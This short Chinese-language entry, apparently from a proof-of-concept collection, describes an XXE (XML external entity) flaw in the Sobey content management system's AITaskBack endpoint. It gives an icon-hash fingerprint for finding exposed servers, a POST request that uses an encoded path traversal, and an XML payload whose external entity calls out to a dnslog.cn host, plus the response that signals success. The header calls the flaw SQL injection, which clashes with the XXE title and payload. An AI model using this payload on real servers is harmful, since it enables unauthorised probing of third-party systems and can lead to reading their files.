# 索贝内容管理系统AITaskBack存在xml注入漏洞

索贝内容管理系统 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="689611853"`
- **请求**：`POST /sobey-mchEditor/js/%2e%2e/mch/AIInt/AITaskBack?contentid=1&token=&siteCode= HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://xxe.2qa24o.dnslog.cn/xxe_test">
]>
<root>
<TextResult>&xxe;</TextResult>
</root>
```
- **响应特征**：200